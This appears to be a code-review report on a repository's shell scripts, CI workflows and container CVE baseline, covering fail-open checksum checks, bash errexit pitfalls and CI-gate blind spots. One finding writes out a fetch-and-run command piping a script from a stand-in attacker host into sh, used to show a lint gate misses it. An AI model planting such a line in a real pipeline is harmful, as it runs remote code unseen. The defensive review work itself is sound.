# E — build, pipeline, shell and scan

Dimension E · `scripts/*.sh`, `justfile`, `Containerfile`, three GitHub workflows, `.gitlab-ci.yml`, and
`docs/cve-baseline.json` vs the live trivy run · read at `672a500`, 2026-08-31. Every mutation was made in a
`cp -a` copy; no tracked file was touched and `--write-baseline` was not run.

## Summary

* **Four findings trace to one missing line.** `scripts/lib.sh:16` sets `set -euo pipefail` but not `shopt -s
  inherit_errexit`, so bash runs every `$(...)` subshell with errexit **off**. A `die` one call-level inside a
  `$(fn)` is swallowed; the caller gets an empty string at status 0. Worst instance: `install-tools.sh:68`,
  where the sha256 check on every downloaded tool binary does not stop a mismatch. **RW-G5 was closed by a remedy
  that does not work**, and `lib.sh:88-93` records the wrong diagnosis as measured fact.
* **The CVE baseline's rationales hold** — every per-binary count, every named package, and the x/crypto
  anchor at `render.py:61`; `CVE-2026-58055` is a stale row, not a pin bump.

## Findings

### RX-E1 — the pinned-tool digest check fails open
**high** · `scripts/install-tools.sh:68`, reached from `:115`

`file="$(fetch ...)"` runs `fetch` in a command substitution, where errexit is off, so both guards inside are
inert: `digest()`'s `die` for an unpinned version (`:40`) and the `sha256sum -c -` on `:68`. `fetch` returns
the path at status 0 either way; `install_one` unpacks it into `.tools/bin` and `expose_on_path` (`:140-151`)
symlinks it into `/usr/local/bin`. Reproduced with the bodies verbatim — digest arm removed: `error: no pinned
digest for tofu:9.9.9` / `no properly formatted checksum lines found` / `fetch returned rc=0`. Arm restored,
bytes wrong: `WARNING: 1 computed checksum did NOT match` / `fetch returned rc=0`. `:6-20` refuses marketplace
actions because this matches "the Containerfile's standard"; it does not — there the check is a `RUN` and a
failure stops the build. `tofu` is what `just mirror` runs to build the provider mirror baked into the
delivered image, and `:19-20` calls an undigested bump "a hard failure" — measured, a stderr line and exit 0.
**Fix:** RX-E2's one line, or `|| die` on `:68`.

### RX-E2 — `lib.sh` never sets `inherit_errexit`, so `die` is swallowed two levels down
**high** · `scripts/lib.sh:16`

`inherit_errexit` is off by default, so `set -e` is not inherited by command-substitution subshells: a helper
invoked as `$(fn)` runs with errexit off, and a `die` it makes *through another function* exits only the
innermost subshell. Live pairs: `image_tag`→`containerfile_arg` (`lib.sh:100`) from `image-build.sh:23`,
`image-scan.sh:70` and `test-image.sh:14`; `source_revision`→`provider_version` (`lib.sh:131`) and the bare
`git rev-parse` (`:134`) from `image-build.sh:38` and `bundle.sh:61`; `fetch`→`digest` (RX-E1). Measured:
`bash -c 'set -e; f(){ exit 1; }; g(){ local x; x="$(f)"; echo "g continued"; }; r="$(g)"; echo rc=$?'` →
`r=[g continued x=[]] rc=0`; add `shopt -s inherit_errexit` → rc=1. `grep -rn inherit_errexit scripts/
.claude/` → no match. Single-level calls (`verify-provider.sh:43,47,48`, `mirror.sh:57`, `bundle.sh:54,55`,
`install-tools.sh:157`) do fail correctly, which is why this reads as working. **Fix:** `shopt -s
inherit_errexit` beside `set -euo pipefail`. One line, no new surface; re-run `just check` after, since it
turns silent paths into stops.

### RX-E3 — RW-G5's fix does not fix it, and its docstring records a false measurement
**medium** · `scripts/lib.sh:88-93` (comment), `:94-102` (`image_tag`)

RW-G5 (`docs/review-2026-08-30/REVIEW.md:299-306`) diagnosed the swallowed `die` as an argument-position
problem, and the remedy was to assign the substitution to a local. `image_tag` now does, and `:88-93` states
that diagnosis as fact — "when that substitution is an *argument* rather than an assignment the enclosing
command still succeeds". The cause is RX-E2 and both forms behave identically. With `ARG VCOWS_VERSION=`
deleted from a copied Containerfile: assignment form → `rc=0 tag=[localhost/vcows-deploy:]`, execution
continues; argument form → `podman build -t [localhost/vcows-deploy:]`, `outer rc=0`. The issue is closed and
the file now argues against reopening it. **Fix:** RX-E2's line, then correct `:88-93` to name
`inherit_errexit`.

### RX-E4 — the "workflows carry no logic" gate is blind to YAML-anchor command lists
**medium** · `scripts/lint.sh:68-71`; blind spot at `.gitlab-ci.yml:36-39`

`commands()` walks a `script:` list and yields only `str` items. `.gitlab-ci.yml` splices `&bootstrap` — a
three-command *list* — into `script:`, so each job's `script` is `[[…], "just check"]` and the nested list is
dropped whole. All four GitLab jobs use `*bootstrap`; the anchor definition is invisible too, since
`commands()` on a bare list of strings recurses into each string and yields nothing. The gate's own extractor
over the committed file yields 13 commands, all `just <recipe>`, and never sees the three bootstrap lines.
Adding `- curl -s https://evil.example/x.sh | sh` to `.bootstrap` in a copy and running the gate verbatim:
`BAD: []`, `GATE EXIT=0`. This gate is what `CLAUDE.md`, `justfile:3-6` and `.gitlab-ci.yml:6-8` cite for "CI
calls `just` recipes and nothing else", RW-G4 was closed on it, and GitLab is the shape it cannot read.
**Fix:** recurse on non-string list items (`yield from commands(item)`). Two lines.

### RX-E5 — the "the scan did not read this image" guard only fires at 100% loss
**medium** · `scripts/image-scan.sh:134`

`[ "$missing" -eq "$accepted" ]` is an equality while the comment at `:126-130` reasons in proportions — "One
or two … is ordinary … *All* of them disappearing at once is not a clean image". Nothing sits between two and
a hundred. With fake trivy/syft/podman on PATH, the real 100-id baseline, and a report carrying 3 `Results`
and exactly one accepted id: `no findings outside the baseline`, `EXIT=0`, after logging `baseline entries no
longer found (99 of 100)`. The same harness correctly dies on `{}`, on `{"Results":[]}` and on 0-of-100 —
RW-G2's floors hold; only this guard is off. It exists for a scan that read *something else*, and a report
from a neighbouring image keeps a few shared ids and passes green. **Fix:** the proportion the comment
implies, e.g. `missing * 2 -gt accepted`. One line.

### RX-E6 — `just bundle` succeeds on the `.cache/` a failed `just scan` left behind
**medium** · `scripts/bundle.sh:50-52`

The only precondition is that the three files exist. `image-scan.sh` writes all three (`:77-81`) *before* it
evaluates the baseline (`:113-141`), so a scan that dies on a new finding leaves a complete, current
`.cache/scan`; `bundle.sh` packages it and exits 0. Reproduced with a fake podman emitting a labelled
docker-archive and one injected finding: `error: 1 new finding(s)  SCAN EXIT=1`, then `bundle
…/.cache/delivery  BUNDLE EXIT=0`, the shipped `trivy.json` carrying `["CVE-2099-99999", "CVE-2026-11822"]`.
Both pipelines chain the recipes, so CI is safe; running the three by hand — `README.md:261-264` documents
that as the delivery procedure — gets a complete, named, checksummed bundle for an image the CVE gate
rejected, with the rejection inside the shipped report where nothing reads it. **Fix:** `image-scan.sh` writes
a `.cache/scan/PASSED` stamp on success and clears it at `:34`; `bundle.sh` requires it. About four lines
across two files.

### RX-E7 — the baseline `note`'s overlap arithmetic is wrong, and now stale
**low** · `docs/cve-baseline.json:4`

"37 + 55 + 18 findings across three targets are 100 distinct ids, because CVE-2026-56854 and GO-2026-5932 are
reported against both Go binaries." Measured: **11** ids appear on two targets, not 2 — the other nine are
`CVE-2026-25680/25681/27136/39821/42502/42506/46600/56852` and `GHSA-hrxh-6v49-42gf`, all shared between
`usr/bin/tofu` and the provider. 110 − 11 = **99** distinct, not 100; the sentence's own arithmetic (110 − 2 =
108) never reached 100 either. It is the sentence a maintainer reads before a hand-edit; its per-binary counts
are right. **Fix:** correct it when `CVE-2026-58055` is trimmed.

### RX-E8 — `accepted` carries no group membership, so a moved id cannot be attributed
**low** · `docs/cve-baseline.json:48` vs `:5`

The six groups carry `count`, `why`, `recheck` and `sources` but no id list, and `accepted` is a flat sorted
array, so nothing in the file says which group covers which id — establishing that `CVE-2026-58055` was a
`rocky-base` row needed the live report and the id's neighbours in the sorted array. `CLAUDE.md` and
`image-scan.sh:5` make accepting a finding a hand-edit precisely so a `why` gets written, but the accepting
edit is an append to `accepted`, which attaches to no `why`: an id with a rationale and one without are
indistinguishable. **Fix:** ids into each group as an `ids` array, `accepted` derived in the jq at
`image-scan.sh:113-117`. Real surface — file it, do not do it today.

### RX-E9 — `source_revision` returns the empty string at status 0 outside a git repo
**low** · `scripts/lib.sh:129-140`, at `:134`

Called as `$(source_revision)` (RX-E2), the `git rev-parse HEAD` failure is swallowed; `image-build.sh:42`
then passes `--build-arg GIT_SHA=""`, overriding `ARG GIT_SHA=unknown` at `Containerfile:90`, so the image
ships an empty `org.opencontainers.image.revision`. With `.git` moved aside in a copy: two `fatal: not a git
repository` lines, then `rev=[] rc=0`. A rebuild from an exported tree with no `.git` is the trigger;
`manifest.py` degrades to `unknown` and `bundle.sh:55` dies pointing at the archive rather than the missing
repo. **Fix:** RX-E2's line makes this a stop at `image-build.sh:38`.

### RX-E10 — the GitLab delivery artifact exceeds GitLab's default size cap
**low**, confidence medium (the cap is not observable from here) · `.gitlab-ci.yml:131-135`, `:161-165`

`.cache/delivery/` measures 156 MB at this commit (144 M gz + 6.7 M SBOM + 2.3 M report). GitLab's instance
default maximum artifact size is 100 MB, so on a stock self-hosted instance the upload is rejected and the
step its own comment calls "what makes the rest of this job worth running" produces nothing; GitHub's
`upload-artifact` has no comparable limit. **Fix:** name the setting in the runner assumptions at
`.gitlab-ci.yml:10-18`. The cap is an instance setting this review cannot observe.

### RX-E11 / RX-E12 — two nits
**RX-E11**, `.github/workflows/image.yml:60-64` and `scheduled.yml:47-48`: `fetch-depth: 0` is justified by
"image-build.sh computes the -dirty suffix from `git status --porcelain`", but neither that nor `git rev-parse
HEAD` needs history beyond the checked-out commit. **RX-E12**, `bundle.sh:93`/`:110-111` and
`README.md:269-279`: `image.tar.sha256` covers the *uncompressed* archive "so a site can check before or after
decompressing", but the receipt block never materialises `image.tar`.

## The CVE baseline against the live scan

First check of the rationales against a real trivy run. Source: `.cache/scan/trivy.json`, written by Phase 0
at `672a500` against `84dcf01a718d`; `--write-baseline` was not run. **Every group's counts are exactly
right** — they are unique ids *per target*, and the live report reproduces each to the number:

| group | claim | measured |
|---|---|---|
| `provider/golang.org/x/crypto` | 37 findings, 27 HIGH, 9 x/crypto | 37 uniq, 27 HIGH, **9** x/crypto HIGH |
| `provider/stdlib` | 11 HIGH from the Go toolchain | **11** HIGH on `stdlib` v1.26.3 |
| `tofu` | 18 findings, 10 HIGH, 0 x/crypto | 18 uniq, 10 HIGH; HIGH pkgs x/mod, x/net, x/text, grpc, otel, oras — **no x/crypto** |
| `rocky-base` | 55 findings, 44 HIGH | 55 uniq, **44** HIGH; openssl-libs 15, gnutls 13, vim-data 9, then sqlite/python3/curl/expat |
| `CVE-2026-56854` | 1 id, both Go binaries, needs x/crypto 0.55.0 | on both, `FixedVersion 0.55.0`; provider v0.46.0, tofu v0.52.0 |
| `CVE-2026-11979` | 1 MEDIUM, libxml2 2.12.5-10.el10, fix …el10_2.3 | present, MEDIUM, exactly those versions |

**The x/crypto acceptance still holds.** Its anchor is `orchestrator/backends/libvirt/render.py:61` — verified
at that exact line, still `"uri": connection_uri(target, "sshcmd"),`. `schema.py:205-219` records why the
provider gets `qemu+sshcmd` and libvirt's own client `qemu+ssh`; that dialer execs OpenSSH, so the nine
x/crypto HIGHs in the provider binary are not on any path this product takes. Both CVEs the `why` names (39828
server-side auth callback, 39831 security-key verification) are present and both server- or verifier-side.

**`CVE-2026-58055` is a stale row, not a pin bump.** Nothing it could depend on moved: `BASE_DIGEST`,
`TOFU_VERSION`, `TOFU_RPM_SHA256`, `PROVIDER_VERSION` and `PROVIDER_SHA256` are unchanged across the whole
`4eb378b..672a500` range and the image was rebuilt from the same `sha256:827d37bc…` base. The scanner moved:
`~/.cache/trivy/db/metadata.json` reports `UpdatedAt 2026-08-30T19:01:43Z`, sixteen hours *after* the
baseline's `generated: 2026-08-30T02:35:19Z`. Its sorted neighbours in `accepted` — `CVE-2026-58013/14/15` —
are all `glib2 2.80.4-12.el10_2.13` rows on the rocky target, so it belonged to `rocky-base`. **The correct
hand-edit:** delete `"CVE-2026-58055"` from `accepted`, leave `rationale["rocky-base"]` alone (its `55 / 44
HIGH` count is already right for the post-removal set), and fix the `note` per RX-E7.

## Checked and sound

* **The delivery bundle.** `SHA256SUMS` lists all four shipped files and nothing else and verifies on all
  four; `gunzip -c …tar.gz | sha256sum` equals `image.tar.sha256` exactly. Archive labels: version `0.1.0.0`,
  revision `672a500a5f3d…` (clean, 40 hex), base digest matching `Containerfile:80`. The naming decision at
  `bundle.sh:14-19` behaves as documented; the worktree-mismatch warning fires, non-fatal.
* **RW-G3 is genuinely fixed.** `ship` (`lib.sh:132-133`) includes `Containerfile` and `.containerignore`; an
  edit to either, to `orchestrator/`, or an untracked new file under a shipped path all produce `-dirty`. The
  one uncovered input is the gitignored `.tools/tofu-mirror` (`Containerfile:137`) — but its provider zip is
  digest-checked in-build at `Containerfile:144`.
* **RW-G2's floors work** — `scan_floor` (`image-scan.sh:56-64`) dies on `{}` and `{"Results":[]}`, the id
  guard dies on 0-of-100, SBOM floor 456 packages matching `:55`; only the equality at `:134` is wrong.
  **RW-G6 is fixed** (`install_one:104-113` warns: `tofu 1.12.6 is on PATH, but this repo pins 9.9.9`), and
  **RW-G1** on both sides (`image.yml:38-40`, `.gitlab-ci.yml:118-120`).
* `--write-baseline` (`image-scan.sh:93-102`) does destroy `rationale`; `CLAUDE.md`'s warning is accurate and
  no `justfile` recipe wraps the flag. The GPL source sidecar is still produced by no script — already
  recorded (D22, `Containerfile:110-112`, the `delivery` skill), so not re-filed, nor is signing (`#6`).

## Not checked

* `.gitlab-ci.yml` has never been executed and this review did not execute it. The GitLab artifact cap
  (RX-E10) is an instance setting, unobservable from here.
* Rootless-podman `--run-dir` / `--user` / bind-mount matrix — dimension G's.
* Whether `CVE-2026-58055` was withdrawn or rescoped upstream; no network lookup was made. The pin-bump
  hypothesis is ruled out from the repo alone.
